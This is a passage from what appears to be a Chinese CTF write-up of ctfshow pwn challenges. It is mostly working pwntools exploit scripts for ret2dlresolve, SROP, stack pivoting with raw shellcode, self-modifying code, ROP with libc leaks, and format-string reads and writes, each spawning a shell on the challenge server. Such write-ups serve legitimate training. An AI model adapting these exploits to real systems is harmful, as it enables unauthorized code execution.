class="comment"># send resolve data and /bin/sh</span></span><br><span class="line">io.send(resolve_data+sh)</span><br><span class="line"><span class="comment"># rop = ROP(&quot;./main_partial_relro_64&quot;)</span></span><br><span class="line"><span class="comment"># rop.raw(offset*&#x27;\x00&#x27;)</span></span><br><span class="line">bin_sh_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line"><span class="comment"># rop.raw(csu(0, 1 ,elf.got[&#x27;read&#x27;],0,bin_sh_addr,len(sh)))</span></span><br><span class="line"><span class="comment"># rop.raw(vuln_addr)</span></span><br><span class="line"><span class="comment"># rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span></span><br><span class="line"><span class="comment"># io.send(rop.chain())</span></span><br><span class="line"><span class="comment"># io.send(sh)</span></span><br><span class="line"><span class="comment"># leak link_map addr</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;write&#x27;</span>],<span class="number">1</span>,<span class="number">0x601008</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;\x00&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">link_map_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(link_map_addr))</span><br><span class="line"><span class="comment"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] = NULL</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line"><span class="comment"># rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span></span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">0x00000000004007a3</span>) <span class="comment"># 0x00000000004007a3: pop rdi; ret;</span></span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line"><span class="comment"># rop.raw(&#x27;\x00&#x27;*(256-len(rop.chain())))</span></span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="86-SROP-64"><a href="#86-SROP-64" class="headerlink" title="86 SROP 64"></a>86 SROP 64</h2><h4 id="溢出想构造ROP链的话，没有动态链接库，本身程序gadget少得可怜，gadget不足，想ret2syscall的话，syscall的参数rax得是59，rdi得是-bin-sh的地址，rsi和rdx得为零，但相关pop的gadget都没有"><a href="#溢出想构造ROP链的话，没有动态链接库，本身程序gadget少得可怜，gadget不足，想ret2syscall的话，syscall的参数rax得是59，rdi得是-bin-sh的地址，rsi和rdx得为零，但相关pop的gadget都没有" class="headerlink" title="溢出想构造ROP链的话，没有动态链接库，本身程序gadget少得可怜，gadget不足，想ret2syscall的话，syscall的参数rax得是59，rdi得是&#x2F;bin&#x2F;sh的地址，rsi和rdx得为零，但相关pop的gadget都没有"></a>溢出想构造ROP链的话，没有动态链接库，本身程序gadget少得可怜，gadget不足，想ret2syscall的话，syscall的参数rax得是59，rdi得是&#x2F;bin&#x2F;sh的地址，rsi和rdx得为零，但相关pop的gadget都没有</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28139</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_offset = <span class="number">0x100</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = elf.symbols[<span class="string">&#x27;global_buf&#x27;</span>]+<span class="number">0x100</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">bytes</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;PWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat ctfshow_flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="87-stack-pivoting-64"><a href="#87-stack-pivoting-64" class="headerlink" title="87 stack pivoting 64"></a>87 stack pivoting 64</h2><h4 id="可控制的栈溢出字节数较少；开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域；其它漏洞难以利用，劫持栈到堆空间，从而在堆上写ROP以及进行堆漏洞利用"><a href="#可控制的栈溢出字节数较少；开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域；其它漏洞难以利用，劫持栈到堆空间，从而在堆上写ROP以及进行堆漏洞利用" class="headerlink" title="可控制的栈溢出字节数较少；开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域；其它漏洞难以利用，劫持栈到堆空间，从而在堆上写ROP以及进行堆漏洞利用"></a>可控制的栈溢出字节数较少；开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域；其它漏洞难以利用，劫持栈到堆空间，从而在堆上写ROP以及进行堆漏洞利用</h4><h4 id="可以控制程序执行流；可以控制rsp指针"><a href="#可以控制程序执行流；可以控制rsp指针" class="headerlink" title="可以控制程序执行流；可以控制rsp指针"></a>可以控制程序执行流；可以控制rsp指针</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28115</span>)</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048d17</span></span><br><span class="line">payload = shellcode_x86 + (</span><br><span class="line">    <span class="number">0x20</span> - <span class="built_in">len</span>(shellcode_x86)) * <span class="string">b&#x27;b&#x27;</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;cat ctfshow_flag&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="88-frame-faking"><a href="#88-frame-faking" class="headerlink" title="88 frame faking"></a>88 frame faking</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28304</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line"><span class="string">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line"><span class="string">shellcode += &quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">jump_addr = <span class="number">0x400767</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writebyte</span>(<span class="params">addr,data</span>):</span><br><span class="line">    payload = <span class="built_in">str</span>(<span class="built_in">hex</span>(addr))+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(data)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;What?&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">writebyte(jump_addr+<span class="number">1</span>,u32(asm(<span class="string">&#x27;jmp $-0x4a&#x27;</span>)[<span class="number">1</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">writebyte(jump_addr,u32(asm(<span class="string">&#x27;jmp $-0x4a&#x27;</span>)[<span class="number">0</span>:<span class="number">1</span>].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x400769</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">chr</span> <span class="keyword">in</span> shellcode:</span><br><span class="line">    writebyte(shell_addr,<span class="built_in">str</span>(<span class="built_in">chr</span>))</span><br><span class="line">    shell_addr+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">writebyte(jump_addr+<span class="number">1</span>,u32(asm(<span class="string">&#x27;jmp $+0x2&#x27;</span>)[<span class="number">1</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat ctfshow_flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">text = <span class="number">0x400767</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeData</span>(<span class="params">addr,data</span>):</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Where What?&#x27;</span>,<span class="built_in">hex</span>(addr) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(data))</span><br><span class="line">writeData(text+<span class="number">1</span>,u32(asm(<span class="string">&#x27;jnz $-0x4A&#x27;</span>)[<span class="number">1</span>:].ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">writeData(text,u32(asm(<span class="string">&#x27;jmp $-0x4A&#x27;</span>)[<span class="number">0</span>:<span class="number">1</span>].ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x0068732f6e69622f</span></span><br><span class="line"><span class="string">	push rax</span></span><br><span class="line"><span class="string">	mov rdi,rsp</span></span><br><span class="line"><span class="string">	mov rax,59</span></span><br><span class="line"><span class="string">	xor rsi,rsi</span></span><br><span class="line"><span class="string">	mov rdx,rdx</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">shellcode_addr = <span class="number">0x400769</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> shellcode:</span><br><span class="line">	data = u8(x)</span><br><span class="line">	writeData(shellcode_addr + i,data)</span><br><span class="line">	i = i + <span class="number">1</span></span><br><span class="line">writeData(text+<span class="number">1</span>,u32(asm(<span class="string">&#x27;jnz $+0x2&#x27;</span>)[<span class="number">1</span>:].ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="89-花栈溢出"><a href="#89-花栈溢出" class="headerlink" title="89 花栈溢出"></a>89 花栈溢出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context(arch = &quot;i386&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28227</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x602010</span></span><br><span class="line">rdiret = <span class="number">0x400be3</span></span><br><span class="line">rsir15 = <span class="number">0x400be1</span></span><br><span class="line">leave = <span class="number">0x400ada</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&#x27;You want to send:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x2000</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1010</span> + p64(bss_addr -<span class="number">0x8</span>) + p64(rdiret) + p64(puts_got) + p64(puts_pl</span><br><span class="line">t)</span><br><span class="line">payload += p64(rdiret) + p64(<span class="number">0</span>) + p64(rsir15) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(read_plt)</span><br><span class="line">payload += p64(leave)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;See you next time!\n&quot;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a2fc</span></span><br><span class="line">io.send(p64(one_gadget))</span><br><span class="line"><span class="comment">#io.send(payload)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="94-fmtstr实现任意地址写"><a href="#94-fmtstr实现任意地址写" class="headerlink" title="94 fmtstr实现任意地址写"></a>94 fmtstr实现任意地址写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28286</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_got = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:sys_got&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat ctfshow_flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="95-格式化字符串实现任意位置读"><a href="#95-格式化字符串实现任意位置读" class="headerlink" title="95 格式化字符串实现任意位置读"></a>95 格式化字符串实现任意位置读</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28159</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">printf = u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf)</span><br><span class="line">libc_base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;system ===&gt; %s&quot;</span> % <span class="built_in">hex</span>(system))</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system&#125;)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="96-格式化字符串泄露内存中的字符"><a href="#96-格式化字符串泄露内存中的字符" class="headerlink" title="96 格式化字符串泄露内存中的字符"></a>96 格式化字符串泄露内存中的字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28253</span>)</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">q = <span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q,q+<span class="number">12</span>):</span><br><span class="line">    payload = <span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>,payload)</span><br><span class="line">    aim = unhex(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).replace(<span class="string">b&#x27;0x&#x27;</span>,<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">    flag+=aim[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="99-flag在栈上的盲打"><a href="#99-flag在栈上的盲打" class="headerlink" title="99 flag在栈上的盲打"></a>99 flag在栈上的盲打</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;error&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">payload</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28182</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;0x&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(p64(<span class="built_in">int</span>(data,<span class="number">16</span>)))</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    leak(payload)</span><br><span class="line">    i+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="100-一次性改写多个值"><a href="#100-一次性改写多个值" class="headerlink" title="100 一次性改写多个值"></a>100 一次性改写多个值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28212</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;00 00 00&#x27;</span>)</span><br><span class="line">fmt(<span class="string">&#x27;%7$n-%16$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x28</span></span><br><span class="line">payload = <span class="string">&#x27;%7$n+%17$p&#x27;</span></span><br><span class="line">fmt(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">ret_value = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">elf_base = ret_value - <span class="number">0x102c</span></span><br><span class="line">payload1 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((elf_base+<span class="number">0xf56</span>)&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%10$hn&#x27;</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload1 += p64(ret_addr)</span><br><span class="line">fmt(payload1)</span><br><span class="line">log.success(<span class="string">&quot;ret_value: &quot;</span>+<span class="built_in">hex</span>(ret_value))</span><br><span class="line">log.success(<span class="string">&quot;ret_addr: &quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

